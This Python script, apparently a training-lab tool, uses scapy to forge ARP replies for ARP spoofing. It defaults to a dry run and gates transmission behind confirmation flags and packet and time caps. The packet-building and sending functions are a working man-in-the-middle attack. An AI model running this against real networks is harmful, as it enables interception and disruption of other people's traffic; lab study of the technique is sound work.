"""Controlled ARP spoofing simulation for authorized isolated labs only."""

import argparse
import math
import time
from collections.abc import Callable
from typing import Any

from scapy.all import ARP, get_if_list, send


MAX_PACKETS = 100
MAX_DURATION_SECONDS = 300.0


class SimulationSafetyError(ValueError):
    """Raised when a transmission request does not meet lab safety requirements."""


def _validate_limits(packet_count: int, duration_seconds: float, interval_seconds: float) -> None:
    if isinstance(packet_count, bool) or not isinstance(packet_count, int) or not 1 <= packet_count <= MAX_PACKETS:
        raise SimulationSafetyError(f"packet_count must be an integer from 1 to {MAX_PACKETS}")
    if isinstance(duration_seconds, bool) or not isinstance(duration_seconds, (int, float)):
        raise SimulationSafetyError("duration_seconds must be a number")
    if not math.isfinite(duration_seconds) or not 0 < duration_seconds <= MAX_DURATION_SECONDS:
        raise SimulationSafetyError(f"duration_seconds must be greater than 0 and no more than {MAX_DURATION_SECONDS}")
    if (
        isinstance(interval_seconds, bool)
        or not isinstance(interval_seconds, (int, float))
        or not math.isfinite(interval_seconds)
        or interval_seconds < 0
    ):
        raise SimulationSafetyError("interval_seconds must be a non-negative number")


def _validate_transmission(interface: str | None, confirmed: bool) -> None:
    if not confirmed:
        raise SimulationSafetyError(
            "Transmission requires --confirm-isolated-lab after verifying this is an authorized isolated lab"
        )
    if not isinstance(interface, str) or not interface.strip():
        raise SimulationSafetyError("Transmission requires an explicit isolated lab interface via --interface")
    try:
        interfaces = get_if_list()
    except Exception as exc:
        raise SimulationSafetyError(f"Unable to validate lab interface '{interface}': {exc}") from exc
    if interface not in interfaces:
        raise SimulationSafetyError(f"Configured lab interface '{interface}' is not available")


def build_spoof_packet(target_ip: str, target_mac: str, spoof_ip: str, spoof_mac: str):
    """Build an ARP reply packet without sending it."""
    return ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=spoof_mac,
    )


def spoof_arp(
    target_ip: str,
    target_mac: str,
    spoof_ip: str,
    spoof_mac: str,
    *,
    interface: str | None = None,
    transmit: bool = False,
    confirm_isolated_lab: bool = False,
    packet_count: int = 1,
    duration_seconds: float = 30.0,
    interval_seconds: float = 2.0,
    send_func: Callable[..., Any] = send,
    sleep_func: Callable[[float], None] = time.sleep,
    clock: Callable[[], float] = time.monotonic,
) -> int:
    """Plan a dry run or send a bounded ARP simulation in an authorized lab."""
    _validate_limits(packet_count, duration_seconds, interval_seconds)
    packet = build_spoof_packet(target_ip, target_mac, spoof_ip, spoof_mac)
    description = f"{spoof_ip} is at {spoof_mac} for target {target_ip}"

    print("WARNING: ARP simulation may disrupt network traffic. Use only in an authorized isolated lab.")
    if not transmit:
        print(f"DRY RUN: would send up to {packet_count} forged ARP reply packet(s): {description}")
        print("To transmit in an isolated lab, use --transmit --confirm-isolated-lab --interface <lab-interface>.")
        return 0

    _validate_transmission(interface, confirm_isolated_lab)
    print(f"LAB TRANSMISSION: sending at most {packet_count} packet(s) for up to {duration_seconds}s on {interface}.")
    started_at = clock()
    sent = 0
    while sent < packet_count and clock() - started_at < duration_seconds:
        send_func(packet, verbose=False, iface=interface)
        sent += 1
        if sent < packet_count and interval_seconds:
            sleep_func(interval_seconds)
    print(f"Simulation stopped after {sent} packet(s).")
    return sent


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Dry-run-first ARP simulation for authorized isolated labs only."
    )
    parser.add_argument("target_ip")
    parser.add_argument("target_mac")
    parser.add_argument("spoof_ip")
    parser.add_argument("spoof_mac")
    parser.add_argument("--interface", help="Explicit isolated lab interface; required for --transmit")
    parser.add_argument("--transmit", action="store_true", help="Allow bounded packet transmission")
    parser.add_argument(
        "--confirm-isolated-lab",
        action="store_true",
        help="Confirm this is an authorized isolated lab",
    )
    parser.add_argument("--count", type=int, default=1, help=f"Maximum packets to send (1-{MAX_PACKETS})")
    parser.add_argument(
        "--duration",
        type=float,
        default=30.0,
        help=f"Maximum duration in seconds (greater than 0, up to {MAX_DURATION_SECONDS:g})",
    )
    parser.add_argument("--interval", type=float, default=2.0, help="Seconds between packets")
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    try:
        spoof_arp(
            args.target_ip,
            args.target_mac,
            args.spoof_ip,
            args.spoof_mac,
            interface=args.interface,
            transmit=args.transmit,
            confirm_isolated_lab=args.confirm_isolated_lab,
            packet_count=args.count,
            duration_seconds=args.duration,
            interval_seconds=args.interval,
        )
    except SimulationSafetyError as exc:
        print(f"Simulation blocked: {exc}")
        return 2
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
